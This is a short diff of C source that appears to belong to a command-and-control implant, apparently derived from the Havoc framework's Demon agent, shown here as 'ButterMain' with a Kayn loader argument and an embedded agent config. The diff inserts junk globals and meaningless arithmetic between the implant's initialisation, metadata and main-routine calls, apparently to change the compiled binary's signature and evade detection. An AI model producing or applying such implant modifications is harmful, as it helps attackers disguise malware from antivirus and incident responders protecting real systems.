@@ -22,6 +22,10 @@
 SEC_DATA PINSTANCE Instance      = { 0 };
 SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
 
+
+
+int lol = 69;
+int not_lol = 67;
 /*
  * In ButterMain it should go as followed:
  *
@@ -33,19 +37,27 @@ SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
  */
 VOID ButterMain( PVOID ModInst, PKAYN_ARGS KArgs )
 {
+    int pew = lol + not_lol;
     INSTANCE Inst = { 0 };
 
+    not_lol = pew - lol;
     /* "allocate" instance on stack */
     Instance = & Inst;
+
+    lol = not_lol+pew;
 
     /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
     ButterInit( ModInst, KArgs );
 
+    lol = pew + not_lol +pew;
+
     /* Initialize MetaData */
     ButterMeDat( &Instance->MetaData, TRUE );
 
+    lol = lol*lol;
     /* Main demon routine */
     ButterRou();
+    pew = pew*pew;
 }
 
 /* Main demon routine:
